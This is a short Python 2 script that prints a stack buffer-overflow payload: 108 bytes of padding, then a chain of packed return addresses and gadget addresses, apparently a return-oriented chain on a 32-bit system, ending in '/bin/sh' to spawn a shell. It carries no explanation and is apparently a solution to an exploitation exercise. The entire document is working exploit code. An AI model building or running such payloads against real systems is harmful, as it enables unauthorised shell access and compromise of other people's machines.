from struct import pack
from shellcode import shellcode
print '0'*108 + pack("<I", 0xbffe95b8) + pack("<I", 0x080481ec) + pack("<I", 0x11111111) + pack("<I", 0x080481ec) + pack("<I", 0xbffe9628) + pack("<I", 0x080b7f8b) + pack("<I", 0x11111111)*15 + pack("<I", 0x080481ec) + pack("<I", 0xbffe962c) + pack("<I", 0x080b7f8b) + pack("<I", 0x11111111)*15 + pack("<I", 0x08057360) + pack("<I", 0xffffffff)*2 + pack("<I", 0xbffe96a4) + pack("<I", 0x08052e80) + (pack("<I", 0x08050bbc) + pack("<I", 0xffffffff))*11 + pack("<I", 0x08055d70) + "/bin/sh"
